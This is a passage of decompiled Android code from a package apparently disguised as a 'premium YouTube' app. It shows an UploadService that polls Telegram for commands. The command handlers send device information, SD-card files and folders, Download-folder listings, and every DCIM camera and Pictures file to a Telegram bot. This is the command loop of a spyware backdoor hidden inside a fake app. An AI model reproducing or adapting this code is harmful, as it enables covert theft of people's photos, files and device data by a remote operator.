                return new AnonymousClass108(this.this$0, this.$filename, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendSdcardFileToTelegram(this.$filename, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$109, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$109", f = "UploadService.kt", i = {}, l = {2032}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass109 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $folder;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass109(UploadService uploadService, String str, Continuation<? super AnonymousClass109> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$folder = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass109(this.this$0, this.$folder, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendSdcardFolderToTelegram(this.$folder, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$110, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$110", f = "UploadService.kt", i = {}, l = {2036}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass110 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass110(UploadService uploadService, Continuation<? super AnonymousClass110> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass110(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        String replyMarkup = this.this$0.buildCommandsKeyboard();
                        this.label = 1;
                        if (this.this$0.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۰String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$branch43$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), replyMarkup, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$111, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$111", f = "UploadService.kt", i = {}, l = {2039}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass111 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass111(UploadService uploadService, Continuation<? super AnonymousClass111> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass111(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextToTelegram(uploadService.listDownloadFolder(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$112, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$112", f = "UploadService.kt", i = {}, l = {2042}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass112 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass112(UploadService uploadService, Continuation<? super AnonymousClass112> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass112(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch45$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$113, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$113", f = "UploadService.kt", i = {}, l = {2043}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass113 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass113(UploadService uploadService, Continuation<? super AnonymousClass113> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass113(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendDeviceInfoZipToTelegram((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$114, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$114", f = "UploadService.kt", i = {}, l = {2047}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass114 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $replyMarkup;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass114(UploadService uploadService, String str, Continuation<? super AnonymousClass114> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$replyMarkup = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass114(this.this$0, this.$replyMarkup, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۲String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$branch46$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), this.$replyMarkup, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$115, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$115", f = "UploadService.kt", i = {}, l = {2051}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass115 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass115(UploadService uploadService, Continuation<? super AnonymousClass115> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass115(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch47$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$116, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$116", f = "UploadService.kt", i = {}, l = {2052}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass116 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass116(UploadService uploadService, Continuation<? super AnonymousClass116> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass116(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllDCIMCameraFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$117, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$117", f = "UploadService.kt", i = {}, l = {2056}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass117 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass117(UploadService uploadService, Continuation<? super AnonymousClass117> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass117(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch48$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$118, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$118", f = "UploadService.kt", i = {}, l = {2060}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass118 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass118(UploadService uploadService, Continuation<? super AnonymousClass118> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass118(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch49$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$119, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$119", f = "UploadService.kt", i = {}, l = {2061}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass119 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass119(UploadService uploadService, Continuation<? super AnonymousClass119> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass119(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllPicturesFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$120, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$120", f = "UploadService.kt", i = {}, l = {2065}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass120 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass120(UploadService uploadService, Continuation<? super AnonymousClass120> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass120(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch50$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$121, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$121", f = "UploadService.kt", i = {}, l = {2069}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass121 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass121(UploadService uploadService, Continuation<? super AnonymousClass121> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass121(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch51$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$122, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$122", f = "UploadService.kt", i = {}, l = {2070}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass122 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass122(UploadService uploadService, Continuation<? super AnonymousClass122> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass122(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllDCIMFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$123, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$123", f = "UploadService.kt", i = {}, l = {2074}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass123 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass123(UploadService uploadService, Continuation<? super AnonymousClass123> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass123(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
